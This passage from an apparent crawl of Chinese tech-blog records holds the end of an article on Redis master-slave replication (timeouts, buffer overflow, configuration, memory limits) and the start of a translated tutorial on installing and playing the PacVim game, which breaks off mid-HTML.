class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">unixtime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">repl_ack_time</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-43\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-44\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Disconnecting timedout slave: %s\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-45\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">replicationGetSlaveName</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-46\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">freeClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-47\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-50\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//此处省略无关代码……</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a2971722378847872-52\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7a2971722378847872-53\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0204 seconds] -->\r\n\n</div>\n<p><strong>需要注意的坑</strong></p>\n<p>下面介绍与复制阶段连接超时有关的一些实际问题：</p>\n<p>（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。</p>\n<p>（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。</p>\n<p>（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys *或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时。</p>\n<h2>3. 复制中断问题</h2>\n<p>主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题。</p>\n<h3>复制缓冲区溢出</h3>\n<p>前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制-&gt;复制缓冲区溢出导致连接中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致连接中断……的循环。</p>\n<p>复制缓冲区的大小由client-output-buffer-limit slave {hard limit} {soft limit} {soft seconds}配置，默认值为client-output-buffer-limit slave 256MB 64MB 60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过config set命令动态配置的（即不重启Redis也可以生效）。</p>\n<p>当复制缓冲区溢出时，主节点打印日志如下所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/5a5a3405eca809876a29206e7e1e8d87.png\" alt=\"\"></p>\n<p><strong>需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。</strong></p>\n<h2>4. 各场景下复制的选择及优化技巧</h2>\n<p>在介绍了Redis复制的种种细节之后，现在我们可以来总结一下，在下面常见的场景中，何时使用部分复制，以及需要注意哪些问题。</p>\n<h3>（1）第一次建立复制</h3>\n<p>此时全量复制不可避免，但仍有几点需要注意：如果主节点的数据量较大，应该尽量避开流量的高峰期，避免造成阻塞；如果有多个从节点需要建立对主节点的复制，可以考虑将几个从节点错开，避免主节点带宽占用过大。此外，如果从节点过多，也可以调整主从复制的拓扑结构，由一主多从结构变为树状结构（中间的节点既是其主节点的从节点，也是其从节点的主节点）；但使用树状结构应该谨慎：虽然主节点的直接从节点减少，降低了主节点的负担，但是多层从节点的延迟增大，数据一致性变差；且结构复杂，维护相当困难。</p>\n<h3>（2）主节点重启</h3>\n<p>主节点重启可以分为两种情况来讨论，一种是故障导致宕机，另一种则是有计划的重启。</p>\n<p><strong>主节点宕机</strong></p>\n<p>主节点宕机重启后，runid会发生变化，因此不能进行部分复制，只能全量复制。</p>\n<p>实际上在主节点宕机的情况下，应进行故障转移处理，将其中的一个从节点升级为主节点，其他从节点从新的主节点进行复制；且故障转移应尽量的自动化，后面文章将要介绍的哨兵便可以进行自动的故障转移。</p>\n<p><strong>安全重启：debug reload</strong></p>\n<p>在一些场景下，可能希望对主节点进行重启，例如主节点内存碎片率过高，或者希望调整一些只能在启动时调整的参数。如果使用普通的手段重启主节点，会使得runid发生变化，可能导致不必要的全量复制。</p>\n<p>为了解决这个问题，Redis提供了debug reload的重启方式：<strong>重启后，主节点的</strong><strong>runid</strong><strong>和offset</strong><strong>都不受影响，</strong>避免了全量复制。</p>\n<p>如下图所示，debug reload重启后runid和offset都未受影响：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6a0ba809748a0d80d181b9b9c05b10f5.png\" alt=\"\"></p>\n<p>但debug reload是一柄双刃剑：它会清空当前内存中的数据，重新从RDB文件中加载，这个过程会导致主节点的阻塞，因此也需要谨慎。</p>\n<h3>（3）从节点重启</h3>\n<p>从节点宕机重启后，其保存的主节点的runid会丢失，因此即使再次执行slaveof，也无法进行部分复制。</p>\n<h3>（4）网络中断</h3>\n<p>如果主从节点之间出现网络问题，造成短时间内网络中断，可以分为多种情况讨论。</p>\n<p>第一种情况：网络问题时间极为短暂，只造成了短暂的丢包，主从节点都没有判定超时（未触发repl-timeout）；此时只需要通过REPLCONF ACK来补充丢失的数据即可。</p>\n<p>第二种情况：网络问题时间很长，主从节点判断超时（触发了repl-timeout），且丢失的数据过多，超过了复制积压缓冲区所能存储的范围；此时主从节点无法进行部分复制，只能进行全量复制。为了尽可能避免这种情况的发生，应该根据实际情况适当调整复制积压缓冲区的大小；此外及时发现并修复网络中断，也可以减少全量复制。</p>\n<p>第三种情况：介于前述两种情况之间，主从节点判断超时，且丢失的数据仍然都在复制积压缓冲区中；此时主从节点可以进行部分复制。</p>\n<h2>5. 复制相关的配置</h2>\n<p>这一节总结一下与复制有关的配置，说明这些配置的作用、起作用的阶段，以及配置方法等；通过了解这些配置，一方面加深对Redis复制的了解，另一方面掌握这些配置的方法，可以优化Redis的使用，少走坑。</p>\n<p>配置大致可以分为主节点相关配置、从节点相关配置以及与主从节点都有关的配置，下面分别说明。</p>\n<h3>（1）与主从节点都有关的配置</h3>\n<p>首先介绍最特殊的配置，它决定了该节点是主节点还是从节点：</p>\n<p>1)   slaveof &lt;masterip&gt; &lt;masterport&gt;：Redis启动时起作用；作用是建立复制关系，开启了该配置的Redis服务器在启动后成为从节点。该注释默认注释掉，即Redis服务器默认都是主节点。</p>\n<p>2)   repl-timeout 60：与各个阶段主从节点连接超时判断有关，见前面的介绍。</p>\n<h3>（2）主节点相关配置</h3>\n<p>1)   repl-diskless-sync no：作用于全量复制阶段，控制主节点是否使用diskless复制（无盘复制）。所谓diskless复制，是指在全量复制时，主节点不再先把数据写入RDB文件，而是直接写入slave的socket中，整个过程中不涉及硬盘；diskless复制在磁盘IO很慢而网速很快时更有优势。需要注意的是，截至Redis3.0，diskless复制处于实验阶段，默认是关闭的。</p>\n<p>2)   repl-diskless-sync-delay 5：该配置作用于全量复制阶段，当主节点使用diskless复制时，该配置决定主节点向从节点发送之前停顿的时间，单位是秒；只有当diskless复制打开时有效，默认5s。之所以设置停顿时间，是基于以下两个考虑：(1)向slave的socket的传输一旦开始，新连接的slave只能等待当前数据传输结束，才能开始新的数据传输 (2)多个从节点有较大的概率在短时间内建立主从复制。</p>\n<p>3)   client-output-buffer-limit slave 256MB 64MB 60：与全量复制阶段主节点的缓冲区大小有关，见前面的介绍。</p>\n<p>4)   repl-disable-tcp-nodelay no：与命令传播阶段的延迟有关，见前面的介绍。</p>\n<p>5)   masterauth &lt;master-password&gt;：与连接建立阶段的身份验证有关，见前面的介绍。</p>\n<p>6)   repl-ping-slave-period 10：与命令传播阶段主从节点的超时判断有关，见前面的介绍。</p>\n<p>7)   repl-backlog-size 1mb：复制积压缓冲区的大小，见前面的介绍。</p>\n<p>8)   repl-backlog-ttl 3600：当主节点没有从节点时，复制积压缓冲区保留的时间，这样当断开的从节点重新连进来时，可以进行全量复制；默认3600s。如果设置为0，则永远不会释放复制积压缓冲区。</p>\n<p>9)   min-slaves-to-write 3与min-slaves-max-lag 10：规定了主节点的最小从节点数目，及对应的最大延迟，见前面的介绍。</p>\n<h3>（3）从节点相关配置</h3>\n<p>1)   slave-serve-stale-data yes：与从节点数据陈旧时是否响应客户端命令有关，见前面的介绍。</p>\n<p>2)   slave-read-only yes：从节点是否只读；默认是只读的。由于从节点开启写操作容易导致主从节点的数据不一致，因此该配置尽量不要修改。</p>\n<h2>6. 单机内存大小限制</h2>\n<p>在 <a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a> 一文中，讲到了fork操作对Redis单机内存大小的限制。实际上在Redis的使用中，限制单机内存大小的因素非常之多，下面总结一下在主从复制中，单机内存过大可能造成的影响：</p>\n<p>（1）切主：当主节点宕机时，一种常见的容灾策略是将其中一个从节点提升为主节点，并将其他从节点挂载到新的主节点上，此时这些从节点只能进行全量复制；如果Redis单机内存达到10GB，一个从节点的同步时间在几分钟的级别；如果从节点较多，恢复的速度会更慢。如果系统的读负载很高，而这段时间从节点无法提供服务，会对系统造成很大的压力。</p>\n<p>（2）从库扩容：如果访问量突然增大，此时希望增加从节点分担读负载，如果数据量过大，从节点同步太慢，难以及时应对访问量的暴增。</p>\n<p>（3）缓冲区溢出：（1）和（2）都是从节点可以正常同步的情形（虽然慢），但是如果数据量过大，导致全量复制阶段主节点的复制缓冲区溢出，从而导致复制中断，则主从节点的数据同步会全量复制-&gt;复制缓冲区溢出导致复制中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致复制中断……的循环。</p>\n<p>（4）超时：如果数据量过大，全量复制阶段主节点fork+保存RDB文件耗时过大，从节点长时间接收不到数据触发超时，主从节点的数据同步同样可能陷入全量复制-&gt;超时导致复制中断-&gt;重连-&gt;全量复制-&gt;超时导致复制中断……的循环。</p>\n<p>此外，主节点单机内存除了绝对量不能太大，其占用主机内存的比例也不应过大：最好只使用50%-65%的内存，留下30%-45%的内存用于执行bgsave命令和创建复制缓冲区等。</p>\n<h2>7. info Replication</h2>\n<p>在Redis客户端通过info Replication可以查看与复制相关的状态，对于了解主从节点的当前状态，以及解决出现的问题都会有帮助。</p>\n<p>主节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/8a91b888c025f2ff104cfca78009de3c.png\" alt=\"\"></p>\n<p>从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9c94677975e945dc3d9caf2dcc75f130.png\" alt=\"\"></p>\n<p>对于从节点，上半部分展示的是其作为从节点的状态，从connectd_slaves开始，展示的是其作为潜在的主节点的状态。</p>\n<p>info Replication中展示的大部分内容在文章中都已经讲述，这里不再详述。</p>\n<h1>七、总结</h1>\n<p>下面回顾一下本文的主要内容：</p>\n<p>1、主从复制的作用：宏观的了解主从复制是为了解决什么样的问题，即数据冗余、故障恢复、读负载均衡等。</p>\n<p>2、主从复制的操作：即slaveof命令。</p>\n<p>3、主从复制的原理：主从复制包括了连接建立阶段、数据同步阶段、命令传播阶段；其中数据同步阶段，有全量复制和部分复制两种数据同步方式；命令传播阶段，主从节点之间有PING和REPLCONF ACK命令互相进行心跳检测。</p>\n<p>4、应用中的问题：包括读写分离的问题（数据不一致问题、数据过期问题、故障切换问题等）、复制超时问题、复制中断问题等，然后总结了主从复制相关的配置，其中repl-timeout、client-output-buffer-limit slave等对解决Redis主从复制中出现的问题可能会有帮助。</p>\n<p>主从复制虽然解决或缓解了数据冗余、故障恢复、读负载均衡等问题，但其缺陷仍很明显：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制；这些问题的解决，需要哨兵和集群的帮助，我将在后面的文章中介绍，欢迎关注。</p>\n<h1>参考文献</h1>\n<p>《Redis开发与运维》</p>\n<p>《Redis设计与实现》</p>\n<p>《Redis实战》</p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"CFj9egBfO0\"><p><a href=\"http://mdba.cn/2015/03/16/redis%e5%a4%8d%e5%88%b6%e4%b8%ad%e6%96%ad%e9%97%ae%e9%a2%98-%e6%85%a2%e6%9f%a5%e8%af%a2/\">redis主从复制（1）— 慢查询导致复制中断</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"http://mdba.cn/2015/03/16/redis%e5%a4%8d%e5%88%b6%e4%b8%ad%e6%96%ad%e9%97%ae%e9%a2%98-%e6%85%a2%e6%9f%a5%e8%af%a2/embed/#?secret=CFj9egBfO0\" data-secret=\"CFj9egBfO0\" width=\"600\" height=\"338\" title=\"《redis主从复制（1）— 慢查询导致复制中断》—DBA的罗浮宫\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"JuAJkx6Lpr\"><p><a href=\"https://redislabs.com/blog/top-redis-headaches-for-devops-replication-buffer/\">Top Redis Headaches for Devops – Replication Buffer</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"https://redislabs.com/blog/top-redis-headaches-for-devops-replication-buffer/embed/#?secret=JuAJkx6Lpr\" data-secret=\"JuAJkx6Lpr\" width=\"600\" height=\"338\" title=\"“Top Redis Headaches for Devops – Replication Buffer” — Redis Labs\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<blockquote class=\"wp-embedded-content\" data-secret=\"KtHjsj0weV\"><p><a href=\"http://mdba.cn/2015/03/17/redis%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6%ef%bc%882%ef%bc%89-replication-buffer%e4%b8%8ereplication-backlog/\">redis主从复制（2）— replication buffer与replication backlog</a></p></blockquote>\n<p><iframe class=\"wp-embedded-content\" sandbox=\"allow-scripts\" security=\"restricted\" style=\"position: absolute; clip: rect(1px, 1px, 1px, 1px);\" src=\"http://mdba.cn/2015/03/17/redis%e4%b8%bb%e4%bb%8e%e5%a4%8d%e5%88%b6%ef%bc%882%ef%bc%89-replication-buffer%e4%b8%8ereplication-backlog/embed/#?secret=KtHjsj0weV\" data-secret=\"KtHjsj0weV\" width=\"600\" height=\"338\" title=\"《redis主从复制（2）— replication buffer与replication backlog》—DBA的罗浮宫\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\"></iframe></p>\n<p><a href=\"https://github.com/antirez/redis/issues/918\">https://github.com/antirez/redis/issues/918</a></p>\n<p>https://blog.csdn.net/qbw2010/article/details/50496982</p>\n<p>https://mp.weixin.qq.com/s?__biz=MzIxMzEzMjM5NQ==&amp;mid=2651029484&amp;idx=1&amp;sn=5882f4c7c390a0a0e4f6dfd872e203b5&amp;chksm=8c4caae8bb3b23fe77909e307d45a071186f55069e5207602c61383eab573885615c1d835904&amp;mpshare=1&amp;scene=1&amp;srcid=0327SokqtxEY3WojWNDMHLYl#rd</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114194\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114194votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114194\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Redis,数据库", "author": "编程迷思", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"}
{"title": "PacVim：一个学习 vim 命令的命令行游戏", "createdate": "2018/06/19", "url": "http://blog.jobbole.com/114134/", "url_object_id": "f852671c846c5a0304c03ce2522024c6", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png"], "thumbs": 1, "bookmark": 1, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/pacvim-a-cli-game-to-learn-vim-commands/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9738-1.html?pr\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png\" alt=\"\"></p>\n<p>你好，Vim用户！今天，我偶然发现了一个很酷的程序来提高 Vim 的使用技巧。Vim 是编写和编辑代码的绝佳编辑器。然而，你们中的一些人（包括我）仍在陡峭的学习曲线中挣扎。再也不用了！来看看 <strong>PacVim</strong>，一款可帮助你学习 Vim 命令的命令行游戏。PacVim 的灵感来源于经典游戏 <a href=\"https://en.wikipedia.org/wiki/Pac-Man\">PacMan</a>，它以一种好玩有趣的方式为你提供了大量的 Vim 命令练习。简而言之，PacVim 是一种深入了解 vim 命令的有趣而自由的方式。请不要将 PacMan 与 <a href=\"https://www.ostechnix.com/getting-started-pacman/\">pacman</a> （arch Linux 包管理器）混淆。 PacMan 是 20 世纪 80 年代发布的经典流行街机游戏。</p>\n<p>在本简要指南中，我们将看到如何在 Linux 中安装和使用 PacVim。</p>\n<h3 id=\"toc_1\">安装 PacVim</h3>\n<p>首先按如下链接安装 <strong>Ncurses</strong> 库和<strong>开发工具</strong>。</p>\n<ul>\n<li><a href=\"https://www.ostechnix.com/how-to-install-ncurses-library-in-linux/\">如何在 Linux 中安装 Ncurses 库</a></li>\n<li><a href=\"https://www.ostechnix.com/install-development-tools-linux/\">如何在 Linux 中安装开发工具</a></li>\n</ul>\n<p>请注意，如果没有 gcc 4.8.X 或更高版本，这款游戏可能无法正确编译和安装。我在 Ubuntu 18.04 LTS 上测试了 PacVim，并且完美运行。</p>\n<p>安装 Ncurses 和 gcc 后，运行以下命令来安装 PacVim。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a403c198048721400\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git clone https://github.com/jmoon018/PacVim.git\r\n$ cd PacVim\r\n$ sudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c198048721400-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c198048721400-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c198048721400-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c198048721400-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a403c198048721400-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/jmoon018/PacVim.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c198048721400-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-i\">PacVim</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a403c198048721400-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c198048721400-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">使用 PacVim 学习 Vim 命令</h3>\n<h4 id=\"toc_3\">启动 PacVim 游戏</h4>\n<p>要玩这个游戏，只需运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a403c1a1681959441\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim [LEVEL_NUMER] [MODE]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c1a1681959441-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c1a1681959441-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a403c1a1681959441-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LEVEL_NUMER</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">MODE</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c1a1681959441-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>例如，以下命令以普通模式启动游戏第 5 关。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a403c1a5829469109\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button 